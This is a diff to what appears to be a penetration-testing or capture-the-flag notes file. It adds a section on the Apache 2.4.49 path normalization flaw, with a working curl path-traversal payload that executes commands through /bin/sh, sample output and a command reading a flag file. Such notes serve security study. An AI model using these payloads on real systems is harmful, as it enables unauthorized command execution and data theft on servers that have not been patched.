@@ -18,6 +18,35 @@ nikto -h [target] -C all
 
 * Run early, its slow but good
 
+### Apache 2.4.49 Path Normalization RCE
+
+Apache `2.4.49` may be vulnerable to path traversal / command execution when CGI is enabled.
+
+Useful indicators:
+
+```text
+80/tcp open  http  Apache httpd 2.4.49 ((Unix))
+|_http-server-header: Apache/2.4.49 (Unix)
+```
+
+Check exposed CGI command execution with `curl --path-as-is`:
+
+```bash
+curl --path-as-is http://TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh -d 'echo; id'
+```
+
+Successful output:
+
+```text
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+```
+
+Run commands through `/bin/sh`:
+
+```bash
+curl --path-as-is http://TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh -d 'echo; cat /home/user/flag.txt'
+```
+
 ### Sanity Check
 
 * Look at robots.txt
